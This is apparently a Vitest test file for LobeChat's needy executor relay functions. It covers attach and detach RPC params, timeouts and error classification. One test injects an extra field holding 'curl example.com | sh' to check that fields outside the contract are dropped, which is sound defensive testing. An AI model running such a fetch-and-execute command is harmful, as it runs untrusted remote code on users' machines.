import type { GatewayHttpClient } from '@lobechat/device-gateway-client';
import { NEEDY_EXECUTOR_ERROR_PREFIX, NEEDY_EXECUTOR_UNSUPPORTED_MESSAGE } from '@lobechat/types';
import { describe, expect, it, vi } from 'vitest';

import { attachNeedyExecutor, detachNeedyExecutor } from './needyExecutor';

const address = { deviceId: 'device-1', userId: 'user-1', workspaceId: 'ws-1' };
const params = {
  address: { host: 'needy-daemon.example.com', port: 7400 },
  attachmentId: 'session-1',
  credential: 'needy-runner.secret',
  runnerName: 'ext-0123456789ab-mac',
  ttlSeconds: 3600,
  version: '0.0.22',
};

const clientWith = (invokeRpc: ReturnType<typeof vi.fn>) => () =>
  ({ invokeRpc }) as unknown as GatewayHttpClient;

describe('needy executor relays', () => {
  it('attaches with exactly the contract params and a timeout that covers a download', async () => {
    const data = {
      attachmentId: 'session-1',
      expiresAt: '2026-11-27T01:00:00.000Z',
      reused: false,
      runnerName: 'ext-0123456789ab-mac',
      version: '0.0.22',
    };
    const invokeRpc = vi.fn(async () => ({ data, success: true }));

    const result = await attachNeedyExecutor(clientWith(invokeRpc), address, {
      ...params,
      // Anything beyond the contract is dropped, not relayed.
      ...({ command: 'curl example.com | sh' } as object),
    });

    expect(result).toEqual({ data, status: 'ok' });
    expect(invokeRpc).toHaveBeenCalledWith(
      { deviceId: 'device-1', timeout: 180_000, userId: 'user-1', workspaceId: 'ws-1' },
      { method: 'attachNeedyExecutor', params },
    );
  });

  it('detaches by attachment id', async () => {
    const invokeRpc = vi.fn(async () => ({ data: { detached: true }, success: true }));

    const result = await detachNeedyExecutor(clientWith(invokeRpc), address, {
      attachmentId: 'session-1',
    });

    expect(result).toEqual({ data: { detached: true }, status: 'ok' });
    expect(invokeRpc).toHaveBeenCalledWith(
      { deviceId: 'device-1', timeout: 30_000, userId: 'user-1', workspaceId: 'ws-1' },
      { method: 'detachNeedyExecutor', params: { attachmentId: 'session-1' } },
    );
  });

  it.each([
    [NEEDY_EXECUTOR_UNSUPPORTED_MESSAGE, 'unsupported'],
    ['Unknown device RPC method: attachNeedyExecutor', 'unsupported'],
    [`${NEEDY_EXECUTOR_ERROR_PREFIX} needy runner exited with code 1`, 'failed'],
    ['Device is offline', 'unavailable'],
  ])('classifies %j as %s', async (error, status) => {
    const invokeRpc = vi.fn(async () => ({ error, success: false }));

    const result = await attachNeedyExecutor(clientWith(invokeRpc), address, params);

    expect(result).toEqual({ message: error, status });
  });

  it('reports a missing gateway as unavailable', async () => {
    const result = await attachNeedyExecutor(() => null, address, params);

    expect(result).toEqual({ message: 'Device Gateway is not configured', status: 'unavailable' });
  });
});
